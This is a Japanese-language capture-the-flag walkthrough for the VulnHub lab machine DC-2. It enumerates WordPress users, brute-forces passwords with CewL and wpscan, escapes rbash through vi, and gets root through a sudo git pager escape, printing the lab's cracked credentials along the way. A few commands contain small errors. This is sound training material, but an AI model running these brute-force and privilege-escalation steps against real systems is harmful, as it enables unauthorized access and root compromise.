## DC-2 454~
## 目的
- flag1 webサイト
- flag2 wordpress login
- flag3 ターゲットフォルダ
- flag4 ターゲットフォルダ
- finalflag rootフォルダ
- 合計5つのフラグを表示する

### ポートスキャンまでは同じ
- ポートスキャン
  - 80(http)
  - 7744(ssh) オプションに`-sV`とかつけないと謎のサービスを出してくることがある

### WEBサイトを見る
- `192.168.56.104`でサイトを見ると`dc-2`に飛ばされる(リダイレクトと呼ぶ)
- 直すために`sudo vim /etc/hosts`に以下のように書き込む
- `192.168.56.104 dc-2`
- これはipアドレスにドメインネームを設定している
- サイトが開くのでflag1を見つける
- サイトを見てFLAGSを探す。3つヒントが書いてある。
- 1. Cewlを使う
  2. 1人でログイン
  3. 別名でログイン



### gobuster
- `gobuster dir -b 403,404 -u $URL -w /usr/share/wordlists/dirb/common.txt -x php -t 50`
  - `$URL`の代わりに`$IP`でもOK
  - `-b` statusの403,404は表示しない 
  - `-x` 拡張子がphpも探す
  - `-t` スレッド数を50に増やす。デフォルトは10
- `/wp-admin`があることがわかる

### ブラウザでチェックしてみる
- 先ほど取得した`/wp-admin`ディレクトリでサイトにアクセスしてみるとwordPressのダッシュボードの認証ページに飛ぶことがわかる。HTMLのコードを見ると、`/wp-login.php`にpostしているのがわかる
- wordpressが使われているので、できるだけ専用のwpscanコマンドを使った方が効率的である
- それ以上は特にわからない

### Nmap NSE
- nmap nseはnmapのスキャンを利用して、同時にスクリプトを実行できる。ここではwordPressのユーザを見つけることができる。
- nmapスクリプトで使えるのを探す。次ので検索すると出てくる
  - `cat /usr/share/nmap/scripts/script.db | grep wordpress | grep user` 
- `nmap -p80 --script http-wordpress-users dc-2`
  - `-p80`はなくてもいい 
- userが3人であることがわかる
- users.txtを作る
  - `cat > users.txt` で３人の名前を書いて、改行して ctrl + c
  - ```
    admin
    jerry
    tom 
    ```
- http-wordpress-usersのスクリプト(プログラム)は`/usr/share/nmap/scripts`
- (補足)wpscanでもできる cf690



### CewL
- CewLは指定したWEBサイトをスクレイピングして、キーワードを辞書ファイルとして生成するツール
- `cewl dc-2 -w cewl.txt`
  - パスが通っていないのでCewlフォルダに入って実行する
  - dc-2は/etc/hostsで設定したIPアドレスで、そこの対象のサイトをスクレイピングする
  - -wはファイルの書き込みを指定していて、ここでは一つ上のフォルダに指定している。
  - 絶対パスで作ったフォルダに入れてもいい。実はこっちの方がいい `-w ~/vulnhub/dc2/cewl.txt`

### wpscan
- `wpscan --url http://dc-2  -U users.txt -P cewl.txt`
- または、こっちだとユーザネームもやってくるれる
- `wpscan --url http://dc-2 --passwords cewl.txt`




### 認証情報
- 結果２人の情報がわかる

|ユーザ名|パスワード|
|:-|:-|
|admin|?|
|jerry|adipiscing|
|tom|parturient|

### WordPressのダッシュボードにアクセスする
  - `http://192.168.56.104/wp-admin/`
  - 二人のどちらかでNmapとHydraで得たuser,passwordを入力してアクセスする
  - Flag2を見つける 

### jerryでssh
- jerryでログインするが失敗する。jerryはwordpressのパスワードとsshのパスワードを使い回していない

### tomでSSH
- wordPressの投稿者がsshのユーザと仮定している
- tomでssh `ssh -p 7744 tom@$IP`
- passwordを入力

### 実行できるコマンドを調べる
- `echo $PATH`を見ると、PATHが一つしかない、ここにあるコマンドが使える
- `ls $PATH`を見るとコマンドが４つしか使えない
- プロンプトが返ってくる `echo $SHELL`でrbashという制限が多いシェルだとわかる 

### 通常のシェルを使えるようにする
  - viは使えるのでGTFOBinsで`vi`でシェルを呼び出すのを見つける
  - viを呼び出す
  - `:set shell=/bin/sh`
  - Enterを押す
  - `:shell`
  - Enterを押す
  - `$`が出たら成功、これで通常のシェルが使えるようになる

### シェルを確認する
- `echo $SHELL`
  - userのシェルの設定がわかる 
- `echo $0`
  - 実際に起動しているシェルがわかる
- 制限のあるrbashから通常のshのシェルになっている。ただし、`su`コマンドは使えないのでjerryにはユーザを変えれない

### 環境変数を設定する
- 通常のコマンドが使えるようにPATHを追加する
- `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin/:/usr/bin:/sbin:/bin`
- 確認する `echo $PATH`
- ちなみに、suコマンドは/binにあるので、これだけでもいい。またこの時点でLinpeas.shは取得できる

### ユーザでsshする
- 複数の候補があった時に一番ルートが取れそうな権限の強いユーザの利用を目指す

### jerryでssh
- ユーザを切り替え `su jerry`
- suとsshのパスワードは違う。まえのパスワードはsuのパスワードだったようだ

### sudoコマンドの設定を調べる
- `sudo -l`
- 次の表示がされるが、これはgitをrootなしで使えることがわかる
  - `(root) NOPASSWORD: /usr/bin/git`
### git
- GTFOBinsでgitコマンドを利用して、root権限を取得する
- `sudo git -p help config`
- `:`と出てきたら成功で以下を入力
- `!/bin/sh`  
### Flagを取得
  - `cd /root | cat final-flag.txt` 
